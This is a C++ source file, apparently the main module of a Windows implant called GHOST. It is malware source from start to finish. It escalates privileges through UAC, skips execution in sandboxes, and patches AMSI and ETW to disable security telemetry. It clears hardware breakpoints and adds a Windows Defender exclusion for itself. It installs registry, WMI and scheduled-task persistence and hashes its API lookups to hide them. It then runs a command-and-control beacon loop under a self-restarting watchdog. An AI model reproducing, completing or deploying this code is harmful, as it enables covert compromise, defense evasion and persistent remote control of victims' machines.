#include <windows.h>
#include <shellapi.h>
#include <algorithm>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

// ─── Win32-only debug log — zero CRT, survives elevated child, catches crashes ─
#ifdef DEBUG
static void _DbgWrite(const char* msg) {
    OutputDebugStringA(msg);
    HANDLE hf = CreateFileA(
        "C:\\Users\\Public\\ghost_debug.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hf, msg, (DWORD)lstrlenA(msg), &w, NULL);
        CloseHandle(hf);
    }
}
static void DBG(const char* fmt, ...) {
    char buf[512];
    va_list va; va_start(va, fmt);
    wvsprintfA(buf, fmt, va);  // Win32 only — no CRT
    va_end(va);
    lstrcatA(buf, "\r\n");
    _DbgWrite(buf);
}
#else
static void DBG(const char*, ...) {}
#endif

// ─── NtDelayExecution sleep ───────────────────────────────────────────────────
static void NtSleep(DWORD ms) {
    typedef NTSTATUS(NTAPI* Fn)(BOOLEAN, PLARGE_INTEGER);
    static Fn pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        if (h) pfn = reinterpret_cast<Fn>(HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    } else {
        Sleep(ms);
    }
}

static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

// ─── Elevation ────────────────────────────────────────────────────────────────
static BOOL EnsureElevated() {
    if (IsElevated()) return TRUE;
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    SHELLEXECUTEINFOW sei  = {};
    sei.cbSize             = sizeof(sei);
    sei.fMask              = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb             = L"runas";
    sei.lpFile             = exePath;
    sei.lpParameters       = L"--elevated";
    sei.nShow              = SW_SHOW; // ponytail: SW_HIDE for release
    BOOL ok = ShellExecuteExW(&sei);
    DBG("ShellExecuteExW=%d err=%lu", ok, GetLastError());
    if (ok) { Sleep(1000); return FALSE; }
    MessageBoxW(NULL, L"GHOST requires administrator privileges.",
                L"Elevation Required", MB_ICONERROR | MB_OK);
    return FALSE;
}

// ─── Implant thread ───────────────────────────────────────────────────────────
DWORD WINAPI ImplantThread(LPVOID) {
    DBG("ImplantThread pid=%lu tid=%lu", GetCurrentProcessId(), GetCurrentThreadId());

#ifdef DEBUG
    // Skip sandbox check in debug — it would deep-sleep the test machine
    DBG("SandboxCheck skipped (DEBUG)");
#else
    if (SandboxCheck()) {
        DeepSleep();
        return 1;
    }
#endif

    DBG("DecoyLoop start");
    DecoyLoop();
    DBG("DecoyLoop done");

    // ── Syscalls ──────────────────────────────────────────────────────────────
    DBG("InitializeSyscalls start");
    __try {
        int attempts = 0;
        while (!InitializeSyscalls()) {
            DBG("InitializeSyscalls failed attempt=%d retrying in 5s", ++attempts);
            if (attempts >= 5) {
                DBG("InitializeSyscalls gave up after 5 attempts");
                return 1;
            }
            NtSleep(5000);
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        DBG("InitializeSyscalls EXCEPTION code=0x%08X", GetExceptionCode());
        return 1;
    }
    DBG("InitializeSyscalls done");

    // ── Evasion ───────────────────────────────────────────────────────────────
    DBG("PatchAMSI start");
    __try { PatchAMSI(); } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("PatchAMSI EXCEPTION 0x%08X", GetExceptionCode());
    }
    DBG("PatchETW start");
    __try { PatchETW(); } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("PatchETW EXCEPTION 0x%08X", GetExceptionCode());
    }
    DBG("ClearHardwareBreakpoints start");
    __try { ClearHardwareBreakpoints(); } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("ClearHardwareBreakpoints EXCEPTION 0x%08X", GetExceptionCode());
    }
    DBG("Evasion done");

    // ── Defender exclusion ────────────────────────────────────────────────────
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (IsElevated()) {
        DBG("AddDefenderExclusion start");
        __try { AddDefenderExclusion(exePath); } __except(EXCEPTION_EXECUTE_HANDLER) {
            DBG("AddDefenderExclusion EXCEPTION 0x%08X", GetExceptionCode());
        }
        DBG("AddDefenderExclusion done");
    }

    // ── Persistence ───────────────────────────────────────────────────────────
    DBG("Persistence start");
    __try {
        InstallRegistryPersistence(exePath);
        if (!IsWmiPersistenceInstalled()) {
            InstallWmiPersistence(exePath);
            InstallWmiScriptPersistence(exePath);
        }
        if (!IsScheduledTaskInstalled()) {
            InstallScheduledTaskPersistence(exePath);
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("Persistence EXCEPTION 0x%08X (non-fatal)", GetExceptionCode());
        // Non-fatal — continue to beacon even if persistence fails
    }
    DBG("Persistence done");

    // ── Beacon loop ───────────────────────────────────────────────────────────
    DBG("BeaconLoop start");
    __try {
        BeaconLoop();
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("BeaconLoop EXCEPTION 0x%08X", GetExceptionCode());
        return 1;
    }
    DBG("BeaconLoop returned cleanly");
    return 0;
}

// ─── Entry point ──────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    DBG("===== WinMain pid=%lu =====", GetCurrentProcessId());

    // ── Elevation ─────────────────────────────────────────────────────────────
    bool elevated = lpCmdLine && lstrlenA(lpCmdLine) > 0 &&
                    (lstrcmpA(lpCmdLine, "--elevated") == 0 ||
                     strstr(lpCmdLine, "--elevated") != nullptr);
    DBG("lpCmdLine=[%s] elevated_flag=%d", lpCmdLine ? lpCmdLine : "(null)", (int)elevated);

    if (!elevated) {
        DBG("calling EnsureElevated");
        if (!EnsureElevated()) {
            DBG("parent exiting after elevation request");
            return 0;
        }
    }

    DBG("IsElevated=%d", (int)IsElevated());
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    // ── Resolve kernel32 procs via hash ───────────────────────────────────────
    DBG("resolving kernel32 procs");
    HMODULE hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    DBG("kernel32=%lu", (DWORD)(DWORD_PTR)hKernel32);
    if (!hKernel32) { DBG("kernel32 null"); return 0; }

    auto _CreateThread        = HASHPROC(hKernel32, CreateThread);
    auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
    auto _CloseHandle         = HASHPROC(hKernel32, CloseHandle);
    auto _GetExitCodeThread   = HASHPROC(hKernel32, GetExitCodeThread);

    DBG("CT=%lu WFSO=%lu CH=%lu GECT=%lu",
        (DWORD)(DWORD_PTR)_CreateThread,
        (DWORD)(DWORD_PTR)_WaitForSingleObject,
        (DWORD)(DWORD_PTR)_CloseHandle,
        (DWORD)(DWORD_PTR)_GetExitCodeThread);

    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
        DBG("HASHPROC failed — kernel32 exports not found");
        return 0;
    }

    // ── Watchdog loop ─────────────────────────────────────────────────────────
    DBG("entering watchdog");
    DWORD restartCount = 0;
    while (true) {
        if (restartCount > 0) {
            DWORD backoff = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
            DBG("watchdog backoff %lums restart#%lu", backoff, restartCount);
            Sleep(backoff);
        }
        DBG("spawning ImplantThread restart#%lu", restartCount);
        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
        if (!hThread) {
            DBG("CreateThread failed err=%lu", GetLastError());
            Sleep(5000);
            ++restartCount;
            continue;
        }
        _WaitForSingleObject(hThread, INFINITE);
        DWORD exitCode = 0;
        _GetExitCodeThread(hThread, &exitCode);
        _CloseHandle(hThread);
        DBG("ImplantThread exit code=%lu", exitCode);
        if (exitCode == 0) { DBG("clean exit"); return 0; }
        ++restartCount;
    }
}
